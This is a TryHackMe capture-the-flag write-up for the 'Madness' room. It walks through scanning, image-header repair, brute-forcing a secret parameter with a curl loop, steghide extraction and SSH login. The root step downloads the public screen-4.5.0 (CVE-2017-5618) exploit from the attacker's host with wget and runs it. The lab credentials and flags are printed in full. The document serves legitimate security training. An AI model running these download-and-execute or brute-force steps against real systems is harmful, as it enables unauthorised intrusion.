# 🛡️ TryHackMe – Madness - Writeup

## 📌 Overview
**Room Name:** Madness  
**Platform:** TryHackMe  
**Difficulty:** Easy  
**Category:** Web / Steganography / Brute Force / PrivEsc

Linux machine hiding credentials through layered steganography and encoding. A corrupted image header conceals a hidden directory; brute-forcing a secret parameter yields a steghide passphrase; ROT13 decodes the username; and the room's own cover image holds the SSH password. Privilege escalation via SUID `screen-4.5.0` (CVE-2017-5618).

Attack chain overview:

- Port scan → Apache on 80, SSH on 22
- Directory scan → `thm.jpg` with corrupted magic bytes → hexedit repair → hidden directory path revealed visually
- Brute-force `?secret=` (0–99) → passphrase `y2RPJ4QaPF!B`
- `steghide` on `thm.jpg` → `hidden.txt` → ROT13 → username `joker`
- TryHackMe room cover image → `steghide` (empty passphrase) → SSH password
- SSH as `joker` → SUID `screen-4.5.0` → CVE-2017-5618 → root

---

## 🔍 1. Enumeration

### 🔎 Port Scan

```bash
rustscan -a <TARGET_IP> -r 1-65535 -- -sV -sC
```

```text
22/tcp  open  ssh     OpenSSH 7.2p2 (Ubuntu)
80/tcp  open  http    Apache httpd 2.4.18 (Ubuntu)
```

Port 80 served the Apache default page with no visible content. Ran a directory scan:

```bash
feroxbuster -u http://<TARGET_IP>/ \
  -w /usr/share/wordlists/dirb/common.txt \
  -x php,html,txt
```

Notable result: `http://<TARGET_IP>/thm.jpg`

---

## 🔬 2. Image Header Analysis — thm.jpg

```bash
file thm.jpg
# → data
```

A valid JPEG would return `JPEG image data`. The `data` result indicated a corrupted or spoofed header.

```bash
xxd thm.jpg | head -1
# → 8950 4e47 0d0a 1a0a ...  (PNG magic bytes)
```

The file carried a **PNG header** (`89 50 4E 47 0D 0A 1A 0A`) but `file` still returned `data`, meaning the PNG internal structure was also invalid. The file needed to be opened as a JPEG.

Multiple Python-based replacement attempts were tried — replacing 4, then 12, then 20 bytes with the JPEG header. All failed.

> **Why Python patching failed:** The approaches over-replaced bytes beyond the minimal change needed. Some of the bytes being overwritten were valid image data that shouldn't have been touched. Hexedit allowed direct in-place editing with precise control over exactly which bytes to change.

Used `hexedit` to replace only the first bytes with the correct JPEG signature:

```
ff d8 ff e0 00 10 4a 46  (JPEG/JFIF header start)
```

```bash
eog thm.jpg
```

The repaired image displayed:
- The hidden directory path: **`/th1s_1s_h1dd3n`**
- A sequence of binary digits embedded in the image

---

## 🔓 3. Hidden Directory — Secret Brute Force

```bash
curl http://<TARGET_IP>/th1s_1s_h1dd3n/
```

HTML source comment:
```html
<!-- It's between 0-99 but I don't think anyone will look here -->
```

The page accepted a `?secret=` parameter and validated it against an unknown value. Brute-forced all values 0–99:

```bash
for i in $(seq 0 99); do
    result=$(curl -s "http://<TARGET_IP>/th1s_1s_h1dd3n/?secret=$i")
    if ! echo "$result" | grep -q "That is wrong"; then
        echo "[+] Found! Secret = $i"
        echo "$result"
        break
    fi
done
```

```text
[+] Found! Secret = 73
Urgh, you got it right! But I won't tell you who I am! y2RPJ4QaPF!B
```

Passphrase recovered: **`y2RPJ4QaPF!B`**

---

## 🔬 4. Steganography — thm.jpg → Username

```bash
steghide extract -sf thm.jpg -p 'y2RPJ4QaPF!B'
cat hidden.txt
```

```text
Fine you found the password!
Here's a username
wbxre
I didn't say I would make it easy for you!
```

The username `wbxre` is ROT13-encoded:

```bash
echo "wbxre" | tr 'a-zA-Z' 'n-za-mN-ZA-M'
# → joker
```

Username confirmed: **`joker`**

---

## 🔑 5. Password Discovery — Room Cover Image

Attempting SSH with `y2RPJ4QaPF!B` (the steghide passphrase) as the password failed across all username/encoding combinations — `joker`, `wbxre`, and ROT13 variants of the passphrase itself.

> **Why the passphrase wasn't the password:** In this room, the steghide passphrase and the SSH password are intentionally separate. The passphrase unlocks the steg layer; the actual password is hidden in a second, completely different location — the room's cover image hosted on TryHackMe's own servers. This is an unusual meta-challenge design where part of the puzzle exists outside the target machine.

```bash
wget https://assets.tryhackme.com/additional/imgur/5iW7kC8.jpg
steghide extract -sf 5iW7kC8.jpg -p ""
cat 5iW7kC8.jpg.out
```

```text
I didn't think you'd find me! Congratulations!
Here take my password
*axA&GF8dP
```

SSH password recovered: **`*axA&GF8dP`**

---

## 🔓 6. Initial Access

```bash
ssh joker@<TARGET_IP>
# Password: *axA&GF8dP

whoami
# → joker

cat user.txt
```

**Initial access as `joker` achieved.** ✅

---

## 👑 7. Privilege Escalation: joker → root

### 🔍 Enumeration

```bash
sudo -l
# → Sorry, user joker may not run sudo on ubuntu.

find / -perm -4000 2>/dev/null
```

```text
/bin/screen-4.5.0
/bin/screen-4.5.0.old
```

`screen-4.5.0` with SUID is a well-known vulnerable binary:

```bash
screen -version
# → Screen version 4.05.00 (GNU) 10-Dec-16
```

### 💥 CVE-2017-5618 Exploitation

GNU Screen 4.5.0 contains a local privilege escalation vulnerability. A public exploit (`41154.sh`) abuses the SUID binary via a shared library preload technique.

```bash
# On Kali — serve the exploit
searchsploit -m 41154
python3 -m http.server 80

# On target
cd /tmp
wget http://<KALI_IP>/41154.sh
sh 41154.sh
```

```text
[+] First, we create our shell and library...
[+] Now we create our /etc/ld.so.preload file...
[+] Triggering...
[+] done!

# whoami
root
```

**ROOT ACCESS GRANTED.** ✅

---

## 🏁 Flags

### 🧍 User Flag

```
THM{d5781e53b130efe2f94f9b0354a5e4ea}
```

### 👑 Root Flag

```
THM{5ecd98aa66a6abb670184d7547c8124a}
```

---

## 📚 Key Takeaways

- 🖼️ **`file` returning `data` means the header is wrong — inspect with `xxd` first:** Knowing the expected magic bytes for the target format (JPEG: `FF D8 FF`, PNG: `89 50 4E 47`) makes it possible to identify exactly what needs fixing. Over-patching valid bytes breaks the file further; surgical edits with `hexedit` are safer than Python slice replacements when you're unsure of the boundary.

- 🔢 **Recognise encoding by character set:** `wbxre` contains only alphabetic characters shifted by 13 — the hallmark of ROT13. No tool needed; `tr 'a-zA-Z' 'n-za-mN-ZA-M'` decodes it in one command.

- 🌐 **In meta-challenge rooms, look beyond the target machine:** The SSH password was embedded in the room's cover image hosted externally on TryHackMe's servers. When all logical credential combinations fail, the hint may live outside the attack surface entirely.

- 🔐 **Empty passphrase steghide is worth trying:** `steghide extract -sf file.jpg -p ""` requires no brute-force and costs nothing. Many CTF files use it as the first hiding layer.

- 📋 **SUID on non-standard binaries is a reliable escalation signal:** `/bin/screen-4.5.0` with SUID is immediately suspicious — standard system `screen` binaries don't carry the SUID bit. A version search in searchsploit confirmed a public exploit within seconds.

---

## 🛠️ Tools Used

- `rustscan`
- `feroxbuster`
- `xxd`, `hexedit`
- `steghide`
- `curl` (brute-force loop)
- `tr` (ROT13)
- `ssh`, `wget`
- `find` (SUID search)
- `searchsploit`

---

## 📚 Credit
✍️ Author: Akira Hasuo

📘 Created for educational and portfolio purposes only
